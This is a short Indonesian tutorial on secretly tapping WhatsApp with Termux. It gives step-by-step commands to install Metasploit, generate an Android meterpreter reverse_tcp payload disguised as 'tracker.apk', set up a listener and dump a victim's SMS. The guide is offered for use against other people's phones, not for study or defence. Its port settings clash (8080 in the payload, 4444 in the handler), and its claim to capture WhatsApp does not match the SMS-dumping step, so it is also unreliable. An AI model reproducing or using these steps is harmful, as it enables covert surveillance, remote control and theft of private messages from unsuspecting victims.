# sadapwa dengan termux


adap wa dengan termux , meskipun tutorial kali ini susah untuk dilakuka untuk para pemula tapi setidaknya kita mencoba terlebih dahulu gimana cara sadap wa dengan menggunakan aplikasi termux, untuk tutorial lengkapnya di bawah ini
buka aplikasi termux
masukan semua kode perintah di bawah ini satu persatu
 apt update && apt upgrade
pkg install unstable-repo
pkg install metasploit
kode perintah untuk sadap wa
 msfconsole
kemudian masukan kode perintah di bawah ini
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=8080 -o /sdcard/tracker.apk 
kode perintah Proses sadap wa
 use multi/handler
. set payload android/meterpreter/reverse_tcp
. set lhost 192.168.1.101
. set lport 4444
. exploit
menjalankan perintah sadap wa
 dump_sms
